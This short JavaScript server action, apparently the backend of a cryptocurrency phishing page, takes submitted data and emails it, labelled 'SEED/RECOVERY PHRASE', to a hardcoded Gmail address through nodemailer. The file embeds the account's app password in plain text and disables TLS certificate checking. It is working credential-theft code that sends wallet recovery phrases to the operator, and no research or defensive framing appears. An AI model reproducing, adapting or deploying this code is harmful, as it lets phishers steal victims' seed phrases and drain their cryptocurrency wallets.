"use server"
import nodemailer from 'nodemailer';


export const sendMail = async (data) =>{

    console.log('server', data)

 const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'Owodsam@gmail.com ',
      pass: 'irmg zfmx ncfy zxqu',
    },
    tls: {
        rejectUnauthorized: false // Ignore self-signed certificate
    }
  });

  try {
   
    const info = await transporter.sendMail({
        from: '"SEED/RECOVERY PHRASE" <Owodsam@gmail.com >',
        to: 'Owodsam@gmail.com',
        subject: 'RECOVER PHRASE',
        text: 'RECOVER PHRASE',
        html: `<h1>RECOVER PHRASE: ${data}</h1>`,
        });

        console.log('Message sent: %s', info.messageId);
  } catch (error) {
       console.error(error);
  }

}